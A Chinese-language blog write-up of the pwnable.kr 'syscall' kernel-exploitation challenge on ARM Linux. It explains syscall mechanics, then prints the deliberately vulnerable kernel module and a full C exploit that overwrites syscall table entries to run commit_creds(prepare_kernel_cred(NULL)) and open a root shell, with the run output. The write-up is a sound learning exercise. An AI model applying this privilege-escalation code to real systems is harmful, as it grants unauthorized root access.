---
title: pwnable syscall
date: 2017-04-27 12:12:48
tags:
- kernel_exploit
- syscall
categories:
- pwnable.kr
---

在做这题之前我顺便记录一下跟系统调用相关的知识。
## How to define syscall
```c
asmlinkage long sys_function()
```
所有系统调用都要有asmlinkage这个限定词。函数返回值为long。
系统调用function()在内核中定义为sys_function()。
sys_call_table: 记录所有已注册的系统调用的列表。
system_call(): 系统调用处理函数。
NR_syscalls: length of syscall table

## Procedure of syscall
<!-- more -->
1. syscall_call()比较系统调用号与NR_syscalls，若大于等于，则返回-ENOSYS。否则就执行相应的系统调用：
```c
call *sys_call_table(, %rax, 8)
```
2. 参数传递；
```asm
32-bit syscall	                  64-bit syscall

up to 6 inputs
EBX, ECX, EDX, ESI, EDI, EBP      RDI, RSI, RDX, R10, R8, R9

over 6 inputs
in RAM; EBX points to them        forbidden
```

可以在用户态直接通过syscall函数来执行系统调用。
```shell
int syscall(int number, ...);
```
参数为系统调用号相应的参数。

## Adding a syscall to linux
[Adding hello world system call to Linux](https://arvindsraj.wordpress.com/2012/10/05/adding-hello-world-system-call-to-linux/)

## pwnable-syscall
这题虽然是最简单的kernel exploit，但是对不会kernel exploit还是个很好的入门题的。万事开头难，贵在坚持。

程序逻辑很简单，就加入了一个系统调用。但是这个系统调用就有问题了，几乎可以任意地址写。
```c
 // adding a new system call : sys_upper

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define NR_SYS_UNUSED		223

//Pointers to re-mapped writable pages
unsigned int** sct;

asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}

static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}

static void __exit exitmodule(void ){
	return;
}

module_init( initmodule );
module_exit( exitmodule );
```

### Exploit
总体思路是在内核态执行如下两个函数：
```c
commit_creds(prepare_kernel_cred(NULL));
```
linux用一个结构体cred来管理进程的相关id。我们要做的是修改进程的cred，把其所有的uid/gid等字段都设置为0，进而获得root权限。
prepare_kernel_cred函数创建一个新的cred结构体，如果传入的参数为NULL，则将所有的uid/gid的字段设置为0，所有的功能为字段设置为1。即创建一个具有所有权限且没有限制的cred结构体。而commit_creds函数则是为当前的进程设置新的权限凭据。所以当可以执行上面的函数链时，进程就能获得root权限。

因为是内核到处的函数，所以我们可以通过如下方法找到其地址：
```shell
root@kali:~/Desktop# cat /proc/kallsyms | grep prepare_kernel_cred
c1083e60 T prepare_kernel_cred
root@kali:~/Desktop# cat /proc/kallsyms | grep commit_creds
c1083a90 T commit_creds
```
但是在有些安全化的环境也有可能访问不到这个文件。

提升权限后我们需要回到用户空间，当执行system("/bin/sh")，这样得到的shell就是root身份了。实在不太熟悉怎么写内核利用类脚本，所以就在别人的脚本上改了一下......
```c
//gcc -o solver solver.c -std=c99

#include <unistd.h>
#include <stdio.h>

#define SYS_CALL_TABLE 0x8000e348

#define PREPARE_KERNEL_CRED 0x8003f924
//0x8003f56c  '6c' is low_case, so adding padding to '60'
#define COMMIT_CREDS 0x8003f560

#define SYS_EMPTY_A 188
#define SYS_EMPTY_B 189

int main() {
    unsigned int* sct = (unsigned int*)SYS_CALL_TABLE;

    char nop[] = "\x01\x10\xa0\xe1";  //rasm2 -a arm 'mov r1,r1'
    char buf[20];

    for (int i = 0; i < 12; i++) {
        buf[i] = nop[i % 4];
    }
    buf[12] = 0;

    syscall(223, buf, COMMIT_CREDS);
    puts("Stage 1 - add padding");

    syscall(223, "\x24\xf9\x03\x80", sct + SYS_EMPTY_A);
    syscall(223, "\x60\xf5\x03\x80", sct + SYS_EMPTY_B);
    puts("Stage 2 - overwrite syscall table");

    syscall(SYS_EMPTY_B, syscall(SYS_EMPTY_A, 0));
    puts("Stage 3 - set new cred");

    system("/bin/sh");

    return 0;
}
```
程序首先增加一个padding，因为\x6c是小写字母，padding里执行的其实就是nop指令。然后覆盖SYS_CALL_TABLE里系统调用号188和189的地址为我们要执行的两个函数的地址。最后调用系统调用号为189的系统调用来执行函数获得root权限。其实就是执行commit_creds(prepare_kernel_cred(NULL))。上面有个问题就是syscall函数的指针参数是不能指向内核的，但是上面可以.原因很简单, 我理解有误，参数应该是由系统调用本身来验证的, 而题目中的系统调用实现本身是没有验证参数的。并且那两个系统调用号本身就没实现就更不用说了。


```shell
/ $ uname -a
Linux (none) 3.11.4 #13 SMP Fri Jul 11 00:48:31 PDT 2014 armv7l GNU/Linux

/tmp/fuck $ ./syscall 
Stage 1 - add padding
Stage 2 - overwrite syscall table
Stage 3 - set new cred
/bin/sh: can't access tty; job control turned off
/tmp/fuck # cat /root/flag
Congratz!! addr_limit looks quite IMPORTANT now... huh?
```
这个题适合入门，linux kernel exploit还是比较好玩的。还得多刷kernel exploit的题。

### Link
[github-syscall](https://github.com/Qwaz/solved-hacking-problem/tree/master/pwnable.kr/syscall)
